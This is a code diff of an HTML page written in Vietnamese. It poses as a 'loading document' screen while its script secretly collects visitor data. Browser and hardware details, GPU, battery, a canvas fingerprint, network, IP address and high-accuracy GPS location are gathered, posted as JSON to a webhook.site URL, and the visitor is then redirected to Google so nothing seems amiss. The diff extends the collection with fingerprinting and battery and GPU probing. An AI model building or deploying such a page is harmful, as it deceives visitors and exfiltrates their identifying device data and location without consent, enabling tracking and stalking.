@@ -5,37 +5,99 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Đang tải tài liệu...</title>
     <style>
-        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f4f4f4; margin: 0; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; color: #333; }
+        .container { text-align: center; }
+        .loader { border: 4px solid #e0e0e0; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { margin-top: 15px; font-size: 16px; font-weight: 500; }
     </style>
 </head>
 <body>
 
-    <div class="loader"></div>
-    <p style="margin-left: 15px;">Vui lòng chờ trong giây lát...</p>
+    <div class="container">
+        <div class="loader"></div>
+        <p>Vui lòng chờ trong giây lát, tài liệu đang được tải...</p>
+    </div>
 
     <script>
         (async function() {
             // --- CẤU HÌNH ---
             const WEBHOOK_URL = "https://webhook.site/de82030e-a647-4012-b7f4-c539d868de62";
-            const REDIRECT_TO = "https://www.google.com"; // Chuyển hướng sau khi lấy tin xong
+            const REDIRECT_TO = "https://www.google.com";
 
-            let data = {};
+            let data = {
+                browser: {},
+                hardware: {},
+                battery: {},
+                fingerprint: {},
+                screen: {},
+                network: {},
+                time: {},
+                context: {},
+                location: {}
+            };
 
             try {
-                // 1. Thông tin cơ bản từ Trình duyệt (Navigator)
+                // 1. Thông tin cơ bản từ Trình duyệt
                 data.browser = {
                     userAgent: navigator.userAgent,
                     platform: navigator.platform,
                     language: navigator.language,
+                    vendor: navigator.vendor,
                     cookieEnabled: navigator.cookieEnabled,
-                    doNotTrack: navigator.doNotTrack,
-                    hardwareConcurrency: navigator.hardwareConcurrency, // Số nhân CPU
-                    deviceMemory: navigator.deviceMemory // RAM (GB)
+                    doNotTrack: navigator.doNotTrack
                 };
 
-                // 2. Thông tin Màn hình & Cửa sổ
+                // 2. Thông tin Phần cứng (CPU, RAM)
+                data.hardware = {
+                    hardwareConcurrency: navigator.hardwareConcurrency || "N/A", // Số nhân CPU
+                    deviceMemory: navigator.deviceMemory || "N/A", // RAM (GB)
+                    maxTouchPoints: navigator.maxTouchPoints || 0 // Số điểm cảm ứng
+                };
+
+                // Lấy thông tin GPU (Card đồ họa)
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        data.hardware.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                        data.hardware.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                } catch (e) { data.hardware.gpu = "Không lấy được"; }
+
+                // 3. Thông tin Pin
+                if (navigator.getBattery) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        data.battery = {
+                            level: (battery.level * 100).toFixed(0) + "%",
+                            isCharging: battery.charging
+                        };
+                    } catch (e) { data.battery = "Không lấy được"; }
+                } else {
+                    data.battery = "Trình duyệt không hỗ trợ API Pin";
+                }
+
+                // 4. Định danh Canvas Fingerprinting
+                try {
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    ctx.textBaseline = "top";
+                    ctx.font = "14px 'Arial'";
+                    ctx.textBaseline = "alphabetic";
+                    ctx.fillStyle = "#f60";
+                    ctx.fillRect(125, 1, 62, 20);
+                    ctx.fillStyle = "#069";
+                    ctx.fillText("Browser Fingerprint 123", 2, 15);
+                    ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                    ctx.fillText("Browser Fingerprint 123", 4, 17);
+                    
+                    // Lấy mã hash để nhận diện thiết bị
+                    data.fingerprint.canvasHash = canvas.toDataURL().slice(-50); 
+                } catch (e) { data.fingerprint = "Lỗi tạo Fingerprint"; }
+
+                // 5. Thông tin Màn hình
                 data.screen = {
                     width: window.screen.width,
                     height: window.screen.height,
@@ -43,11 +105,11 @@
                     orientation: window.screen.orientation ? window.screen.orientation.type : "N/A"
                 };
 
-                // 3. Thông tin Mạng & Thời gian
+                // 6. Thông tin Mạng & Thời gian
                 data.network = navigator.connection ? {
                     type: navigator.connection.effectiveType,
-                    downlink: navigator.connection.downlink,
-                    rtt: navigator.connection.rtt
+                    downlink: navigator.connection.downlink + " Mbps",
+                    rtt: navigator.connection.rtt + " ms"
                 } : "Không hỗ trợ";
 
                 data.time = {
@@ -55,20 +117,20 @@
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                 };
 
-                // 4. Thông tin Nguồn truy cập (Referrer)
+                // 7. Nguồn truy cập
                 data.context = {
                     url: window.location.href,
                     referrer: document.referrer || "Truy cập trực tiếp"
                 };
 
-                // 5. Lấy Địa chỉ IP (Dùng dịch vụ bên thứ 3)
+                // 8. Lấy Địa chỉ IP
                 try {
                     const ipRes = await fetch('https://api.ipify.org?format=json');
                     const ipData = await ipRes.json();
                     data.ip = ipData.ip;
-                } catch (e) { data.ip = "Bị chặn bởi Adblock"; }
+                } catch (e) { data.ip = "Lỗi hoặc bị chặn"; }
 
-                // 6. Lấy Tọa độ GPS (Nếu người dùng bấm "Cho phép")
+                // 9. Lấy Tọa độ GPS
                 if (navigator.geolocation) {
                     await new Promise((resolve) => {
                         navigator.geolocation.getCurrentPosition(
@@ -80,26 +142,28 @@
                                 };
                                 resolve();
                             },
-                            () => {
-                                data.location = "Người dùng từ chối cấp quyền";
+                            (err) => {
+                                data.location = `Lỗi GPS: ${err.message}`;
                                 resolve();
                             },
-                            { timeout: 5000 }
+                            { timeout: 5000, enableHighAccuracy: true } // Thêm enableHighAccuracy để lấy vị trí chuẩn hơn
                         );
                     });
+                } else {
+                    data.location = "Trình duyệt không hỗ trợ GPS";
                 }
 
-                // 7. GỬI DỮ LIỆU VỀ WEBHOOK
+                // --- GỬI DỮ LIỆU VỀ WEBHOOK ---
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
-                    mode: 'no-cors', // Tránh lỗi CORS khi test
-                    body: JSON.stringify(data)
+                    mode: 'no-cors', 
+                    body: JSON.stringify(data, null, 2) // Thêm null, 2 để format JSON đẹp hơn trên Webhook
                 });
 
             } catch (err) {
-                console.error("Lỗi:", err);
+                console.error("Đã xảy ra lỗi:", err);
             } finally {
-                // Cuối cùng là chuyển hướng để người dùng không nghi ngờ
+                // Chuyển hướng
                 setTimeout(() => {
                     window.location.href = REDIRECT_TO;
                 }, 1000);
